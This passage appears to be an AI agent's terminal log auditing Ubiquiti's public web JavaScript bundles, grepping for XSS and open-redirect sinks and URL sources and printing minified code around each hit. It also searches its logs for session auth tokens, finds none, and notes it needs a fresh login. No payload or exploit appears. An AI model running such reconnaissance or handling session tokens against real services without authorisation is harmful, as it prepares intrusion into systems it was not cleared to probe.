+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+x-cache: FunctionGeneratedResponse from cloudfront
+via: 1.1 3cbb5c6a1d6edd44645d6cae9ad47d80.cloudfront.net (CloudFront)
+x-amz-cf-pop: DFW56-P4
+x-amz-cf-id: R4svU2arNtPhR3hEchGrqNgPu5Og69Zd3SIStYOh9g9p11yApyf-zg==
+x-xss-protection: 1; mode=block
+x-frame-options: SAMEORIGIN
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+strict-transport-security: max-age=31536000
+x-robots-tag: noindex
+
+=== raw unifi html size ===
+-rw-r--r-- 1 runner runner 0 Nov 28 07:28 unifi.html
+[0m
+[0m$ [0mcd /tmp/s34
+mkdir -p wwwjs
+while read -r p; do
+  f="wwwjs/$(basename "$p")"
+  [ -f "$f" ] || curl -fsS --max-time 30 "https://www.ui.com$p" -o "$f" 2>/dev/null
+done < www-alljs.txt
+ls wwwjs | wc -l
+du -sh wwwjs
+echo "=== sink regexes across www chunks ==="
+grep -rEno 'dangerouslySetInnerHTML|insertAdjacentHTML|document\.write|\.innerHTML\s*=|new Function\(|eval\(|\.srcdoc\s*=' wwwjs | sort | head -40
+echo "=== count by type ==="
+for pat in 'dangerouslySetInnerHTML' 'insertAdjacentHTML' 'document\.write' '\.innerHTML\s*=' 'new Function\(' '\.srcdoc\s*='; do printf "%s: " "$pat"; grep -rEo "$pat" wwwjs | wc -l; done
+36
+3.0M	wwwjs
+=== sink regexes across www chunks ===
+wwwjs/08ap5_0xtv1jr.js:540:dangerouslySetInnerHTML
+wwwjs/08ap5_0xtv1jr.js:540:dangerouslySetInnerHTML
+wwwjs/099-ze3g9j76l.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:.innerHTML=
+wwwjs/0w9snb1cuo60k.js:1:.innerHTML=
+wwwjs/0w9snb1cuo60k.js:1:.innerHTML=
+wwwjs/0w9snb1cuo60k.js:1:.innerHTML=
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/0w9snb1cuo60k.js:1:dangerouslySetInnerHTML
+wwwjs/1b4ucgmbwd8nt.js:333:.innerHTML=
+wwwjs/1o48qqrc8xpkn.js:1:.innerHTML=
+wwwjs/1o48qqrc8xpkn.js:1:.innerHTML=
+wwwjs/2g8fpf-u7ypyg.js:116:dangerouslySetInnerHTML
+wwwjs/2g8fpf-u7ypyg.js:197:dangerouslySetInnerHTML
+wwwjs/3jzk1w2zhrxgq.js:1:dangerouslySetInnerHTML
+wwwjs/3jzk1w2zhrxgq.js:1:dangerouslySetInnerHTML
+wwwjs/3qz-ufud26idy.js:540:dangerouslySetInnerHTML
+wwwjs/3qz-ufud26idy.js:550:dangerouslySetInnerHTML
+wwwjs/3qz-ufud26idy.js:550:dangerouslySetInnerHTML
+wwwjs/3qz-ufud26idy.js:736:dangerouslySetInnerHTML
+wwwjs/3qz-ufud26idy.js:917:dangerouslySetInnerHTML
+wwwjs/42snxfm7shlge.js:31:dangerouslySetInnerHTML
+=== count by type ===
+dangerouslySetInnerHTML: 28
+insertAdjacentHTML: 0
+document\.write: 0
+\.innerHTML\s*=: 7
+new Function\(: 0
+\.srcdoc\s*=: 0
+[0m
+Account bundle unchanged; www has a new deploy. Auditing the new www chunks for URL sources and redirect/HTML sinks.
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== URLSearchParams / searchParams usage ==="
+grep -rEno 'searchParams\.get\([^)]*\)|useSearchParams|new URLSearchParams|new URL\(' . | head -40
+echo
+echo "=== location.href/replace/assign/window.open sinks ==="
+grep -rEno 'location\.(href|replace|assign)|window\.open\(' . | head -40
+echo
+echo "=== query param literals get(\"...\") ==="
+grep -rhoE '\.get\("[^"]+"\)' . | sort -u | head -40
+=== URLSearchParams / searchParams usage ===
+./02aqcd17vx73t.js:1:new URL(
+./2g8fpf-u7ypyg.js:2:new URLSearchParams
+./3racnxu1ero-m.js:1:new URL(
+./3racnxu1ero-m.js:1:new URL(
+./3racnxu1ero-m.js:1:new URL(
+./turbopack-077hmtqrhcoji.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:searchParams.get(o.NEXT_RSC_UNION_QUERY)
+./0yq4grgdgv_kn.js:1:searchParams.get(o.NEXT_RSC_UNION_QUERY)
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:1:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+./0yq4grgdgv_kn.js:2:new URL(
+
+=== location.href/replace/assign/window.open sinks ===
+./02aqcd17vx73t.js:1:location.replace
+./3racnxu1ero-m.js:1:location.href
+./0yq4grgdgv_kn.js:1:location.href
+./0yq4grgdgv_kn.js:2:location.href
+./0yq4grgdgv_kn.js:2:location.href
+./0yq4grgdgv_kn.js:2:location.href
+./3qz-ufud26idy.js:767:location.href
+./3qz-ufud26idy.js:913:window.open(
+./3qz-ufud26idy.js:917:location.assign
+./0w9snb1cuo60k.js:1:location.href
+./0w9snb1cuo60k.js:1:location.href
+./0w9snb1cuo60k.js:1:location.href
+./0w9snb1cuo60k.js:1:location.href
+./0w9snb1cuo60k.js:1:location.href
+./0w9snb1cuo60k.js:1:location.href
+./42snxfm7shlge.js:31:location.href
+./42snxfm7shlge.js:31:location.href
+./42snxfm7shlge.js:31:location.href
+./0w9frl-gaurpb.js:34:location.replace
+./0w9frl-gaurpb.js:34:location.href
+./0w9frl-gaurpb.js:34:location.replace
+./0w9frl-gaurpb.js:34:window.open(
+./0w9frl-gaurpb.js:34:window.open(
+
+=== query param literals get("...") ===
+.get("X-Request-URL")
+.get("a")
+.get("appview")
+.get("c")
+.get("content-type")
+.get("dpl")
+.get("other")
+.get("set-cookie")
+.get("vary")
+.get("x-action-redirect")
+.get("x-action-revalidated")
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== chunk sizes ==="
+ls -lS | head -40
+echo
+echo "=== search for interesting params: redirect/next/link/return/url/code/token ==="
+grep -rhoE '"[a-zA-Z_]*(redirect|next|return|link|url|code|token|callback)[a-zA-Z_]*"' . | sort | uniq -c | sort -rn | head -40
+=== chunk sizes ===
+total 3060
+-rw-r--r-- 1 runner runner 933947 Nov 28 07:29 3qz-ufud26idy.js
+-rw-r--r-- 1 runner runner 229176 Nov 28 07:29 0w9snb1cuo60k.js
+-rw-r--r-- 1 runner runner 194275 Nov 28 07:29 08ap5_0xtv1jr.js
+-rw-r--r-- 1 runner runner 161151 Nov 28 07:29 01lu87tmwy33h.js
+-rw-r--r-- 1 runner runner 159952 Nov 28 07:29 0yq4grgdgv_kn.js
+-rw-r--r-- 1 runner runner 112594 Nov 28 07:29 0cz1d0mv5g_q7.js
+-rw-r--r-- 1 runner runner 107584 Nov 28 07:29 3_w-1emub4gzj.js
+-rw-r--r-- 1 runner runner  86763 Nov 28 07:29 0tipfvt-y8dgk.js
+-rw-r--r-- 1 runner runner  80059 Nov 28 07:29 099-ze3g9j76l.js
+-rw-r--r-- 1 runner runner  79153 Nov 28 07:29 0w9frl-gaurpb.js
+-rw-r--r-- 1 runner runner  73850 Nov 28 07:29 02artkfhcdhr9.js
+-rw-r--r-- 1 runner runner  71662 Nov 28 07:29 0_51puko7iz-f.js
+-rw-r--r-- 1 runner runner  60690 Nov 28 07:29 0fndjv7e61i3b.js
+-rw-r--r-- 1 runner runner  59245 Nov 28 07:29 1b4ucgmbwd8nt.js
+-rw-r--r-- 1 runner runner  57099 Nov 28 07:29 3racnxu1ero-m.js
+-rw-r--r-- 1 runner runner  45344 Nov 28 07:29 2r55-pzowgk9w.js
+-rw-r--r-- 1 runner runner  45014 Nov 28 07:29 1d5xufar1ui2c.js
+-rw-r--r-- 1 runner runner  44950 Nov 28 07:29 0eub7_yarwgaf.js
+-rw-r--r-- 1 runner runner  42509 Nov 28 07:29 2w8a8spxpn681.js
+-rw-r--r-- 1 runner runner  40352 Nov 28 07:29 02aqcd17vx73t.js
+-rw-r--r-- 1 runner runner  38907 Nov 28 07:29 2g8fpf-u7ypyg.js
+-rw-r--r-- 1 runner runner  38534 Nov 28 07:29 0sjscz6_8banh.js
+-rw-r--r-- 1 runner runner  38084 Nov 28 07:29 1a12f2fndc6ma.js
+-rw-r--r-- 1 runner runner  35705 Nov 28 07:29 3jzk1w2zhrxgq.js
+-rw-r--r-- 1 runner runner  31245 Nov 28 07:29 0w25l1y4sjmmp.js
+-rw-r--r-- 1 runner runner  30581 Nov 28 07:29 1fj3euuy3tlke.js
+-rw-r--r-- 1 runner runner  30573 Nov 28 07:29 3g7g-ctnvbi8_.js
+-rw-r--r-- 1 runner runner  25663 Nov 28 07:29 2glwgwm8__gk0.js
+-rw-r--r-- 1 runner runner  21750 Nov 28 07:29 2q5xuinhsijkc.js
+-rw-r--r-- 1 runner runner  15016 Nov 28 07:29 2zj4qkbs5nssc.js
+-rw-r--r-- 1 runner runner  14404 Nov 28 07:29 1o48qqrc8xpkn.js
+-rw-r--r-- 1 runner runner  14063 Nov 28 07:29 43y9gca_onbct.js
+-rw-r--r-- 1 runner runner  13688 Nov 28 07:29 42snxfm7shlge.js
+-rw-r--r-- 1 runner runner  11199 Nov 28 07:29 turbopack-077hmtqrhcoji.js
+-rw-r--r-- 1 runner runner   9165 Nov 28 07:29 1_ehlaxnhrfd3.js
+-rw-r--r-- 1 runner runner   1028 Nov 28 07:29 0l8-cgduqjvpc.js
+
+=== search for interesting params: redirect/next/link/return/url/code/token ===
+     38 "link"
+     11 "url"
+      3 "return"
+      2 "redirect"
+      2 "code"
+      2 "__next_error__"
+      1 "xmlnsXlink"
+      1 "xlinkType"
+      1 "xlinkTitle"
+      1 "xlinkShow"
+      1 "xlinkRole"
+      1 "xlinkHref"
+      1 "xlinkArcrole"
+      1 "xlinkActuate"
+      1 "urljoin"
+      1 "uplinkSpeed"
+      1 "uplink"
+      1 "unlink"
+      1 "unicodeRange"
+      1 "unicodeEmail"
+      1 "unicodeBidi"
+      1 "nextItem"
+      1 "next"
+      1 "linkRange"
+      1 "linkPuncturing"
+      1 "linkClicked"
+      1 "encodeBasicAuthUsername"
+      1 "encode"
+      1 "downlinkSpeed"
+      1 "decode"
+      1 "codePointLength"
+      1 "codePointAt"
+      1 "__next_viewport_boundary__"
+      1 "__next_root_layout_boundary__"
+      1 "__next_outlet_boundary__"
+      1 "__next_metadata_route__"
+      1 "__next_metadata_image_meta__"
+      1 "__next_metadata_boundary__"
+      1 "__next_metadata__"
+      1 "__next_img_default"
+[0m
+[0m→ [0mRead result/unresolved.md
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== 02aqcd17vx73t location.replace context ==="
+grep -oE '.{80}location\.replace.{120}' 02aqcd17vx73t.js | head
+echo "=== 3racnxu1ero-m location.href context ==="
+grep -oE '.{60}location\.href.{80}' 3racnxu1ero-m.js | head
+echo "=== 3qz-ufud26idy window.open/assign context ==="
+grep -oE '.{100}window\.open.{150}' 3qz-ufud26idy.js | head
+grep -oE '.{100}location\.assign.{150}' 3qz-ufud26idy.js | head
+=== 02aqcd17vx73t location.replace context ===
+hasAttribute("download"))return;if(!(0,f.isLocalURL)(r)){o&&(t.preventDefault(),location.replace(r));return}if(t.preventDefault(),i){let e=!1;if(i({preventDefault:()=>{e=!0}}),e)return}let{navigate:p}=e.r(895134);p(r
+=== 3racnxu1ero-m location.href context ===
+lScope&&"function"==typeof self.importScripts,ez=ek&&window.location.href||"http://localhost";e.s(["hasBrowserEnv",0,ek,"hasStandardBrowserEnv",0,eq,"has
+=== 3qz-ufud26idy window.open/assign context ===
+||n.handleLogout)),[n]),k=(0,u.useCallback)(()=>{n?.handleLogout?.()},[n]),x=(0,u.useCallback)(()=>{window.open(ee.f.UNIFI_SITE_MANAGER)},[]),A=(0,u.useCallback)(()=>{n?.handleOrderHistory?.()},[n]),I=(0,u.useCallback)(()=>{n?.handleMyLists?.()},[n]),z=(0,u.use
+id 0}),onLanguageChange:(r,n,t)=>{r.preventDefault();let a=(0,lB.D)(t,o.storeId)??o.language;window.location.assign((0,lB.A)((0,lB.J)(e).path,{...o,language:a}))}})})},lM=({onChange:e})=>{let o="true"===(0,eC.useSearchParams)().get("appview");return(0,u.useEffect)(
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== latest UBIC_AUTH tokens in opencode.log (truncated) ==="
+grep -oE 'UBIC_AUTH=[A-Za-z0-9._-]+' result/logs/opencode.log 2>/dev/null | tail -5 | sed -E 's/(UBIC_AUTH=.{12}).*/\1.../'
+echo "=== count ==="
+grep -oE 'UBIC_AUTH=[A-Za-z0-9._-]+' result/logs/opencode.log 2>/dev/null | sort -u | wc -l
+=== latest UBIC_AUTH tokens in opencode.log (truncated) ===
+=== count ===
+0
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== route-like strings in 02aqcd17vx73t.js ==="
+grep -oE '"/[a-z][a-z0-9/_:-]*"' 02aqcd17vx73t.js | sort -u | head -80
+echo "=== dynamic route patterns ==="
+grep -oE '\[[a-zA-Z]+\]' 02aqcd17vx73t.js | sort -u
+=== route-like strings in 02aqcd17vx73t.js ===
+"/accessory-tech"
+"/accessory-tech/air-wire"
+"/accessory-tech/cloud-keys-gateways"
+"/accessory-tech/internet-backup"
+"/accessory-tech/internet-solutions"
+"/accessory-tech/sfp-wizard"
+"/accessory-tech/travel-router"
+"/camera-security"
+"/camera-security/bullet"
+"/camera-security/compact"
+"/camera-security/dome"
+"/camera-security/dome-turret"
+"/camera-security/door-access"
+"/camera-security/door-access/intercoms"
+"/camera-security/door-access/readers"
+"/camera-security/door-access/touch-pass"
+"/camera-security/interior-design"
+"/camera-security/ptz"
+"/camera-security/special-devices"
+"/camera-security/special-devices/ai-enhancements"
+"/camera-security/special-devices/compact-cameras"
+"/camera-security/special-devices/doorbells"
+"/camera-security/special-devices/floodlight"
+"/camera-security/special-devices/super-link"
+"/camera-security/video-recorders"
+"/cloud-gateways"
+"/cloud-gateways/compact"
+"/cloud-gateways/dream-machine"
+"/cloud-gateways/dream-router"
+"/cloud-gateways/dream-wall"
+"/cloud-gateways/enterprise-scale"
+"/cloud-gateways/enterprise-scale/partner-hub/partner-program"
+"/cloud-gateways/enterprise-scale/partner-program"
+"/cloud-gateways/express"
+"/cloud-gateways/large-scale"
+"/cloud-gateways/resource-calculator"
+"/cloud-gateways/ultra"
+"/cloud-gateways/wifi-integrated"
+"/cloud-gateways/wifi-integrated/dream-router"
+"/cloud-gateways/wifi-integrated/dream-wall"
+"/cloud-gateways/wifi-integrated/express"
+"/cloud-storage"
+"/consoles"
+"/consoles/cloud-console"
+"/consoles/resource-calculator"
+"/door-access"
+"/door-access/control-hubs"
+"/door-access/intercoms"
+"/door-access/locks-accessories"
+"/door-access/readers"
+"/door-access/starter-kits"
+"/door-access/touch-pass"
+"/download"
+"/download/app/endpoint-desktop"
+"/download/app/identity-android"
+"/download/app/identity-desktop"
+"/download/app/identity-ios"
+"/download/app/wifiman-desktop"
+"/download/releases/firmware"
+"/download/releases/unifi-os-server"
+"/download/unifi/download-started"
+"/download/unifi/unifi-os-native/download-started"
+"/download/unifi/unifi-os/download-started"
+"/endpoint"
+"/how-it-works"
+"/how-it-works/large"
+"/how-it-works/massive-scale"
+"/how-it-works/multi-site"
+"/identity"
+"/identity/qrcode/desktop/bt_pairing"
+"/install"
+"/integrations"
+"/integrations/accessory-tech"
+"/integrations/accessory-tech/air-wire"
+"/integrations/accessory-tech/internet-solutions"
+"/integrations/accessory-tech/sfp-wizard"
+"/integrations/accessory-tech/travel-router"
+"/integrations/cloud-keys-gateways"
+"/integrations/cloud-keys-gateways/control-plane-options"
+"/integrations/cloud-keys-gateways/independent-gateways"
+=== dynamic route patterns ===
+[a]
+[e]
+[o]
+[productFamily]
+[r]
+[role]
+[s]
+[slug]
+[t]
+[0m
+No saved tokens; need a fresh login. First, doing an independent fresh sink/source review of the current account bundle.
+[0m$ [0mcd /tmp/s34
+echo "=== sink counts in account.js ==="
+for pat in 'dangerouslySetInnerHTML' 'insertAdjacentHTML' 'document\.write' '\.innerHTML\s*=' '\.outerHTML\s*=' 'new Function\(' 'eval\(' '\.srcdoc\s*=' 'location\.(assign|replace)\(' 'location\.href\s*=' 'window\.open\('; do printf "%-28s " "$pat"; grep -oE "$pat" account.js | wc -l; done
+echo
+echo "=== sources: hash/search/href reads ==="
+for pat in 'location\.hash' 'location\.search' 'location\.href' 'document\.referrer' 'URLSearchParams' 'searchParams' 'addEventListener\("message"' "addEventListener\('message'"; do printf "%-32s " "$pat"; grep -oE "$pat" account.js | wc -l; done
+=== sink counts in account.js ===
+dangerouslySetInnerHTML      18
+insertAdjacentHTML           0
+document\.write              0
+\.innerHTML\s*=              16
+\.outerHTML\s*=              0
+new Function\(               0
+eval\(                       0
+\.srcdoc\s*=                 0
+location\.(assign|replace)\( 12
+location\.href\s*=           13
+window\.open\(               7
+
+=== sources: hash/search/href reads ===
+location\.hash                   2
+location\.search                 7
+location\.href                   39
+document\.referrer               2
+URLSearchParams                  44
+searchParams                     76
+addEventListener\("message"      0
+addEventListener\('message'      0
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== .innerHTML= contexts (60 before/120 after) ==="
+grep -oE '.{60}\.innerHTML\s*=.{120}' account.js | head -40
+=== .innerHTML= contexts (60 before/120 after) ===
+ath/MathML`,a);break;case`script`:o=s.createElement(`div`),o.innerHTML=`<script><\/script>`,o=o.removeChild(o.firstChild);break;case`select`:o=typeof r.is==`string`?s.createElement(`select`,{
+ll){if(a.children!=null)throw Error(i(60));o?.__html!==n&&(e.innerHTML=n)}}break;case`multiple`:e.multiple=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`muted`:e.muted=r&&typeof r!=`
+ll){if(a.children!=null)throw Error(i(60));o?.__html!==n&&(e.innerHTML=n)}}break;case`children`:if(typeof r==`string`)fn(e,r);else if(typeof r==`number`||typeof r==`bigint`)fn(e,``+r);else re
+:function(e){var t=document.createElement(`script`);return t.innerHTML=e,t},gtm:function(e){var t=n.default.tags(e);return{noScript:function(){var e=document.createElement(`noscript`);return 
+t:function(){var e=document.createElement(`script`);return e.innerHTML=t.script,e},dataScript:this.dataScript(t.dataLayerVar)}},initialize:function(e){var t=e.gtmId,n=e.events,r=n===void 0?{}
+(!e||e===`assertive`)&&this.assertiveLog&&(this.assertiveLog.innerHTML=``),(!e||e===`polite`)&&this.politeLog&&(this.politeLog.innerHTML=``))}};function lO(e,t){let{elementType:n=`button`,isD
+on`?iqe:rqe)(e)):this.node().textContent}function oqe(){this.innerHTML=``}function sqe(e){return function(){this.innerHTML=e}}function cqe(e){return function(){var t=e.apply(this,arguments);t
+Callback)(n=>{if(window.SendSafelyDropzone){n.firstChild&&(n.innerHTML=``);try{let o=new window.SendSafelyDropzone($at,n);o.url=eot,o.disableAutoSubmit=!0,o.logoPath=Zat,o.STILL_WORKING_MESSA
+.useCallback)(()=>{t.current=null,s(0),n.current&&(n.current.innerHTML=``,u(n.current))},[u]);return{initializeDropzone:d,isDropzoneLoading:c,uploads:o,ongoingUploads:t.current?.hasOngoingUpl
+{if(n){let i=e.documentElement.querySelector(n);return i&&(i.innerHTML=o(t,r)),e}return e.documentElement.innerHTML=o(t,r),e}}var u=typeof document==`object`&&document.createElement(`template
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== dangerouslySetInnerHTML contexts (120 before/160 after) ==="
+grep -oE '.{120}dangerouslySetInnerHTML.{160}' account.js | head -20
+=== dangerouslySetInnerHTML contexts (120 before/160 after) ===
+click=bn);return;case`onScroll`:r!=null&&If(`scroll`,e);return;case`onScrollEnd`:r!=null&&If(`scrollend`,e);return;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));o?.__html!==n&&(e.innerHTM
+]!==`N`)n=_n.get(n)||n,Yt(e,n,r);else return}qt=!0}function Zf(e,t,n,r,a,o){switch(n){case`style`:hn(e,r,o);return;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));o?.__html!==n&&(e.innerHTM
+f(n.hasOwnProperty(o)){var s=n[o];if(s!=null)switch(o){case`src`:r=!0;break;case`srcSet`:a=!0;break;case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:Xf(e,t,o,s,n,null)}}a&&Xf(e,t,`srcSet`,n.srcSet,n,null),r&&Xf(e,t,`src`,n.src,n,null);return;case`input`:If(`invalid`,e);var c=o
+hecked`:l=d;break;case`defaultChecked`:u=d;break;case`value`:o=d;break;case`defaultValue`:c=d;break;case`children`:case`dangerouslySetInnerHTML`:if(d!=null)throw Error(i(137,t));break;default:Xf(e,t,r,d,n,null)}}sn(e,o,c,l,u,s,a,!1);return;case`select`:for(a in If(`invalid`,e),r=s=o=null,n)if(n.hasOwnP
+roperty(s)&&(c=n[s],c!=null))switch(s){case`value`:r=c;break;case`defaultValue`:a=c;break;case`children`:o=c;break;case`dangerouslySetInnerHTML`:if(c!=null)throw Error(i(91));break;default:Xf(e,t,s,c,n,null)}dn(e,r,a,o);return;case`option`:for(l in n)if(n.hasOwnProperty(l)&&(r=n[l],r!=null))switch(l){c
+:case`track`:case`wbr`:case`menuitem`:for(u in n)if(n.hasOwnProperty(u)&&(r=n[u],r!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:Xf(e,t,u,r,n,null)}return;default:if(gn(t)){for(d in n)n.hasOwnProperty(d)&&(r=n[d],r!==void 0&&Zf(e,t,d,r,n,void 0));return}}fo
+&(qt=!0),d=m;break;case`value`:m!==f&&(qt=!0),s=m;break;case`defaultValue`:m!==f&&(qt=!0),c=m;break;case`children`:case`dangerouslySetInnerHTML`:if(m!=null)throw Error(i(137,t));break;default:m!==f&&Xf(e,t,p,m,r,f)}}on(e,s,c,l,u,d,o,a);return;case`select`:for(o in m=s=c=p=null,n)if(l=n[o],n.hasOwnPrope
+l))switch(s){case`value`:a!==o&&(qt=!0),p=a;break;case`defaultValue`:a!==o&&(qt=!0),m=a;break;case`children`:break;case`dangerouslySetInnerHTML`:if(a!=null)throw Error(i(91));break;default:a!==o&&Xf(e,t,s,a,r,o)}un(e,p,m);return;case`option`:for(var h in n)if(p=n[h],n.hasOwnProperty(h)&&p!=null&&!r.has
+,t,g,null,r,p);for(u in r)if(p=r[u],m=n[u],r.hasOwnProperty(u)&&p!==m&&(p!=null||m!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:if(p!=null)throw Error(i(137,t));break;default:Xf(e,t,u,p,r,m)}return;default:if(gn(t)){for(var _ in n)p=n[_],n.hasOwnProperty(_)&&p!==void 0&&!r.hasOwnProper
+tarea`||e===`noscript`||typeof t.children==`string`||typeof t.children==`number`||typeof t.children==`bigint`||typeof t.dangerouslySetInnerHTML==`object`&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var up=null;function bee(){var e=window.event;return e&&e.type===`popstate`
+:throw Error(i(451))}}function Qp(e,t,n){for(var r in n){var i=n[r];n.hasOwnProperty(r)&&i!=null&&Xf(e,t,r,null,$f,i)}n.dangerouslySetInnerHTML!=null&&(e.textContent=``),e.onclick===bn&&(e.onclick=null),Mt(e)}function $p(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);Mt(e)}var em=new M
+only(e.children),{isOpen:r,onClose:n,...i});return(0,I.jsx)(`div`,{"data-role":e.modalId,children:a})},Mtt=/^((children|dangerouslySetInnerHTML|key|ref|autoFocus|defaultValue|defaultChecked|innerHTML|suppressContentEditableWarning|suppressHydrationWarning|valueLink|abbr|accept|acceptCharset|accessKey|a
+className:1,cols:0,colSpan:1,content:0,contentEditable:1,contextMenu:1,controls:0,controlsList:1,coords:0,crossOrigin:1,dangerouslySetInnerHTML:1,data:0,dateTime:1,default:0,defaultChecked:1,defaultValue:1,defer:0,dir:0,disabled:0,disablePictureInPicture:1,disableRemotePlayback:1,download:0,draggable:0
+his.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=c,this.removeEmptyString=l}var u={};[`children`,`dangerouslySetInnerHTML`,`defaultValue`,`defaultChecked`,`innerHTML`,`suppressContentEditableWarning`,`suppressHydrationWarning`,`style`].forEach(e=>{u[e]=new l(e,t,!1,e,null,!1,!1)})
+attribs):h.attribs&&(g=(0,o.default)(h.attribs,h.name));let _;switch(u.type){case`script`:case`style`:u.children[0]&&(g.dangerouslySetInnerHTML={__html:u.children[0].data});break;case`tag`:u.name===`textarea`&&u.children[0]?g.defaultValue=u.children[0].data:u.children?.length&&(_=l(u.children,t));break
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== location.hash contexts ==="
+grep -oE '.{100}location\.hash.{140}' account.js | head
+echo
+echo "=== document.referrer contexts ==="
+grep -oE '.{100}document\.referrer.{140}' account.js | head
+echo
+echo "=== window.open contexts ==="
+grep -oE '.{80}window\.open\(.{140}' account.js | head -20
+=== location.hash contexts ===
+ull,t.state&&t.state.key||`default`,n?{pathname:e.location.pathname,search:e.location.search,hash:e.location.hash}:void 0)}function n(e,t){return typeof t==`string`?t:Bg(t)}return mre(t,n,null,e)}function Ig(e,t){if(e===!1||e==null)throw Error(t)}functi
+},n7=e=>{let t=new URLSearchParams(window.location.search).get(e);if(t!==null)return t;let n=window.location.hash,r=n.indexOf(`?`);return r===-1?null:new URLSearchParams(n.slice(r+1)).get(e)},vBt=()=>((0,F.useEffect)(()=>{let e={type:p_t,status:n7(`stat
+
+=== document.referrer contexts ===
+startsWith(`https://`)&&yw(e),Cve=()=>{let e=window.location.ancestorOrigins?.[0];if(e)return e;if(!document.referrer)return null;try{return new URL(document.referrer).origin}catch{return null}},Qw=e=>{if(!Ww())return!1;let t=Xw();if(!t)return!1;try{let{ori
+
+=== window.open contexts ===
+;return new URL(e).origin===n}catch{return!1}},$w=e=>{let t=Xw();if(!t||!Qw(e)){window.open(e,`_blank`,`noopener,noreferrer`);return}let{pathname:n,search:r,hash:i}=new URL(e);n.startsWith(`//`)?window.open(e,`_blank`,`noopener,nore
+=(e,t,n,r)=>{t===`_self`?r?window.location.replace(e):window.location.assign(e):window.open(e,t,n)},vT=()=>{let e=p_(),{resolveExternal:t}=mT();return(0,F.useCallback)((n,r)=>{if(typeof n==`number`){e(n);return}let i=hT(gT(n));if(i)
+urrent.closed){r.current.focus(),r.current.location.href=e;return}let n=h_t(),a=window.open(e,`msp-idp-consent`,g_t(n));if(!a)t({messageId:`PROFILE_ORGANIZATION_IDP_POPUP_BLOCKED`});else{try{a.moveTo(n.left,n.top),a.resizeTo(J4,Y4)}
+RL(e,VAt.base);Object.entries(t).forEach(([e,t])=>{n.searchParams.append(e,t)}),window.open(n,`_blank`,`noopener,noreferrer`)},{api:{billing:UAt}}={api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,
+ION`,fLt=`addPasskey`,pLt=()=>{let e=IT(`security`,void 0,{[Lw]:!1,[fLt]:!0}),t=window.open(``,`_blank`);return t?(t.opener=null,t.location.href=e,!0):!1},mLt=()=>navigator.userActivation?.isActive??!0,hLt=()=>Ww()&&mLt()&&pLt(),gLt
